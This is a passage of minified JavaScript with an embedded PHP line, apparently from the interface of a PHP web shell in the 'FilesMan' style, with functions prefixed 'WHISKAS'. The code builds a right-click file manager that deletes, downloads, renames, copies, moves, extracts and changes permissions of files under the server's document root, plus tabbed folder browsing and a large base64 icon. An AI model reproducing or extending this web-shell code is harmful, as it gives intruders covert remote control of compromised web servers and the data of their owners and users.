u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){WHISKASFilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;WHISKASRightClickMenu(y,_),e.preventDefault()})})}function WHISKASFilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=WHISKASGetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="WHISKASFilesmanTabShowTitle(this,event);" onmouseout="WHISKASFilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="data:image/png;base64,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AEQAuoAAAQIECIgARAC6gAABAgQqFRABlC68CKC0uPUIECBAQAQgAtAFBAgQIEBABCAC0AUECBAgUKmACKB04UUApcWtR4AAAQIiABGALiBAgAABAiIAEYAuIECAAIFKBUQApQsvAigtbj0CBAgQEAGIAHQBAQIECBAQAYgAdAEBAgQIVCogAihdeBFAaXHrESBAgIAIQASgCwgQIECAgAhABKALCBAgQKBSARFA6cKLAEqLW48AAQIERAAiAF1AgAABAgREACIAXUCAAAEClQqIAEoXXgRQWtx6BAgQICACEAHoAgIECBAgIAIQAegCAgQIEKhUQARQuvAigNLi1iNAgAABEYAIQBcQIECAAAERgAhAFxAgQIBApQIigNKFFwGUFrceAQIECIgARAC6gAABAgQIiABEALqAAAECBCoVEAGULrwIoLS49QgQIEBABCAC0AUECBAgQEAEIALQBQQIECBQqYAIoHThRQClxa1HgAABAiIAEYAuIECAAAECIgARgC4gQIAAgUoFRAClCy8CKC1uPQIECBAQAYgAdAEBAgQIEBABiAB0AQECBAhUKiACKF14EUBpcesRIECAgAhABKALCBAgQICACEAEoAsIECBAoFIBEUDpwosASotbjwABAgREACIAXUCAAAECBEQAIgBdQIAAAQKVCogAShdeBFBa3HoECBAgIAIQAegCAgQIECAgAhAB6AICBAgQqFRABFC68CKA0uLWI0CAAAERgAhAFxAgQIAAARGACEAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigtLj1CBAgQEAEIALQBQQIECBAQAQgAtAFBAgQIFCpgAigdOFFAKXFrUeAAAECIgARgC4gQIAAAQIiABGALiBAgACBSgVEAKULLwIoLW49AgQIEBABiAB0AQECBAgQEAGIAHQBAQIECFQqIAIoXXgRQGlx6xEgQICACEAEoAsIECBAgIAIQASgCwgQIECgUgERQOnCiwBKi1uPAAECBEQAIgBdQIAAAQIERAAiAF1AgAABApUKiABKF14EUFrcegQIECAgAhAB6AICBAgQICACEAHoAgIECBCoVEAEULrwIoDS4tYjQIAAARGACEAXECBAgAABEYAIQBcQIECAQKUCIoDShRcBlBa3HgECBAiIAEQAuoAAAQIECIgARAC6gAABAgQqFRABlC68CKC0uPUIECBAQAQgAtAFBAgQIEBABCAC0AUECBAgUKmACKB04UUApcWtR4AAAQIiABGALiBAgAABAiIAEYAuIECAAIFKBUQApQsvAigtbj0CBAgQEAGIAHQBAQIECBAQAYgAdAEBAgQIVCogAihdeBFAaXHrESBAgIAIQASgCwgQIECAgAhABKALCBAgQKBSARFA6cKLAEqLW48AAQIERAAiAF1AgAABAgREACIAXUCAAAEClQqIAEoXXgRQWtx6BAgQICACEAHoAgIECBAgIAIQAegCAgQIEKhUQARQuvAigNLi1iNAgAABEYAIQBcQIECAAAERgAhAFxAgQIBApQIigNKFFwGUFrceAQIECIgARAC6gAABAgQIiABEALqAAAECBCoVEAGULrwIoLS49QgQIEBABCAC0AUECBAgQEAEIALQBQQIECBQqYAIoHThRQClxa1HgAABAiIAEYAuIECAAAECIgARgC4gQIAAgUoFRAClCy8CKC1uPQIECBAQAYgAdAEBAgQIEBABiAB0AQECBAhUKiACKF14EUBpcesRIECAgAhABKALCBAgQICACEAEoAsIECBAoFIBEUDpwosASotbjwABAgREACIAXUCAAAECBEQAIgBdQIAAAQKVCogAShdeBFBa3HoECBAgIAIQAegCAgQIECAgAhAB6AICBAgQqFRABFC68CKA0uLWI0CAAAERgAhAFxAgQIAAARGACEAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigtLj1CBAgQEAEIALQBQQIECBAQAQgAtAFBAgQIFCpgAigdOFFAKXFrUeAAAECIgARgC4gQIAAAQIiABGALiBAgACBSgVEAKULLwIoLW49AgQIEBABiAB0AQECBAgQEAGIAHQBAQIECFQqIAIoXXgRQGlx6xEgQICACEAEoAsIECBAgIAIQASgCwgQIECgUgERQOnCiwBKi1uPAAECBEQAIgBdQIAAAQIERAAiAF1AgAABApUKiABKF14EUFrcegQIECAgAhAB6AICBAgQICACEAHoAgIECBCoVEAEULrwIoDS4tYjQIAAARGACEAXECBAgAABEYAIQBcQIECAQKUCIoDShRcBlBa3HgECBAiIAEQAuoAAAQIECIgARAC6gAABAgQqFRABlC68CKC0uPUIECBAQAQgAtAFBAgQIEBABCAC0AUECBAgUKmACKB04UUApcWtR4AAAQIiABGALiBAgAABAiIAEYAuIECAAIFKBUQApQsvAigtbj0CBAgQEAGIAHQBAQIECBAQAYgAdAEBAgQIVCogAihdeBFAaXHrESBAgIAIQASgCwgQIECAgAhABKALCBAgQKBSARFA6cKLAEqLW48AAQIERAAiAF1AgAABAgREACIAXUCAAAEClQqIAEoXXgRQWtx6BAgQICACEAHoAgIECBAgIAIQAegCAgQIEKhUQARQuvAigNLi1iNAgAABEYAIQBcQIECAAAERgAhAFxAgQIBApQIigNKFFwGUFrceAQIECIgARAC6gAABAgQIiABEALqAAAECBCoVEAGULrwIoLS49QgQIEBABCAC0AUECBAgQEAEIALQBQQIECBQqYAIoHThRQClxa1HgAABAiIAEYAuIECAAAECIgARgC4gQIAAgUoFRAClCy8CKC1uPQIECBAQAYgAdAEBAgQIEBABiAB0AQECBAhUKiACKF14EUBpcesRIECAgAhABKALCBAgQICACEAEoAsIECBAoFIBEUDpwosASotbjwABAgREACIAXUCAAAECBEQAIgBdQIAAAQKVCogAShdeBFBa3HoECBAgIAIQAegCAgQIECAgAhAB6AICBAgQqFRABFC68CKA0uLWI0CAAAERgAhAFxAgQIAAARGACEAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigtLj1CBAgQEAEIALQBQQIECBAQAQgAtAFBAgQIFCpgAigdOFFAKXFrUeAAAECIgARgC4gQIAAAQIiABGALiBAgACBSgVEAKULLwIoLW49AgQIEBABiAB0AQECBAgQEAGIAHQBAQIECFQqIAIoXXgRQGlx6xEgQICACEAEoAsIECBAgIAIQASgCwgQIECgUgERQOnCiwBKi1uPAAECBEQAIgBdQIAAAQIERAAiAF1AgAABApUKiABKF14EUFrcegQIECAgAhAB6AICBAgQICACEAHoAgIECBCoVEAEULrwIoDS4tYjQIAAARGACEAXECBAgAABEYAIQBcQIECAQKUCIoDShRcBlBa3HgECBAiIAEQAuoAAAQIE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"> <span class="filesman-tab-folder-name">'+i+'</span> <span fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" style="cursor:pointer;color:#ff4444;font-weight:bold;font-size:14px;margin-left:5px;">X</span></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),WHISKAS_fm_id=o,g("FilesMan",l),WHISKAS_fm_id=0}function WHISKASFilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function WHISKASFilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function WHISKASPopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var 